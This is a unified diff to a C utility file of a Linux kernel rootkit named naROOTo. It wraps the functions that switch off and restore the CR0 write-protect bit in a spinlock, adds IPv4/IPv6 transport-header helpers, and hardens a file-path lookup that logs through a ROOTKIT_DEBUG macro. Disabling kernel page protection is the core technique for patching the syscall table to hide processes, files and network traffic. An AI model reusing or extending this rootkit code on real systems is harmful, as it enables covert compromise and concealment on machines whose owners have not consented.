@@ -22,11 +22,18 @@
  * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
  */
 
+#include <linux/dcache.h>
 #include <linux/fdtable.h>
+#include <linux/ip.h>
+#include <linux/ipv6.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
+#include <linux/spinlock.h>
 
 #include "include.h"
+
+static spinlock_t cr0_lock;
+static unsigned long cr0_lock_flags;
 
 /*
  * Converts a string PID to an int.
@@ -53,6 +60,7 @@ convert_atoi(char *str)
 void
 disable_page_protection (void)
 {
+	spin_lock_irqsave(&cr0_lock, cr0_lock_flags);
 	unsigned long value;
 	asm volatile("mov %%cr0,%0" : "=r" (value));
 	if (value & 0x00010000)
@@ -75,35 +83,66 @@ enable_page_protection (void)
 		value |= 0x00010000;
 		asm volatile("mov %0,%%cr0": : "r" (value));
     	}
+	spin_unlock_irqrestore(&cr0_lock, cr0_lock_flags);
+}
+
+/* 
+ * Return the pointer to the transport layer header for an IPv4 packet.
+ */
+void *
+ipv4_get_transport_hdr (struct iphdr *ip_header)
+{
+	return ((__u32 *) ip_header + ip_header->ihl);
+}
+
+/* 
+ * Return the pointer to the transport layer header for an IPv6 packet.
+ */
+void *
+ipv6_get_transport_hdr (struct ipv6hdr *ipv6_header)
+{
+	return ((__u32 *) ipv6_header + 10);
 }
 
 /*
  * Gets the absolute path to a file identified by fd.
  */
 ssize_t
-get_path(unsigned int fd, char *path, size_t bufsiz)
+get_path (unsigned int fd, char *path, size_t bufsiz)
 {
-	struct files_struct *current_files;
-	struct fdtable *files_table;
-	struct path files_path;
+	struct fdtable *fdtable;
+	struct path file_path;
 	size_t path_len;
 	char *cwd;
-	char *buf = (char *) kmalloc(GFP_KERNEL, 128*sizeof(char));
+	char *buf = (char *) kmalloc(1024*sizeof(char), GFP_KERNEL);
+	ssize_t retv = 0;
 	
-	current_files = current->files;
-	files_table = files_fdtable(current_files);
-	
-	files_path = files_table->fd[fd]->f_path;
-	cwd = d_path(&files_path, buf, 100*sizeof(char));
+	fdtable = files_fdtable(current->files);
+	if(fd >= *(fdtable->open_fds)) {
+		ROOTKIT_DEBUG("Error in get_path(): fd >= open_fds");
+		retv = -EBADF;
+		goto out;
+	}	
+
+	file_path = fdtable->fd[fd]->f_path;
+	cwd = d_path(&file_path, buf, 1024*sizeof(char));
+	if(IS_ERR(cwd)) {
+		retv = PTR_ERR(cwd);
+		ROOTKIT_DEBUG("Error in get_path() - d_path failed with error code %li", retv);
+		goto out;
+	}
 	path_len = strlen(cwd);
 	
 	/* check whether the supplied buffer is big enough */
 	if(path_len > bufsiz) {
-		return -ENOMEM;
+		retv = -ENOMEM;
+		goto out;
 	}
 	
 	memcpy(path, cwd, path_len);
+	retv = strlen(cwd);
+out:
+	/* cleanup and return */
 	kfree(buf);
-	
-	return strlen(cwd);
+	return retv;
 }
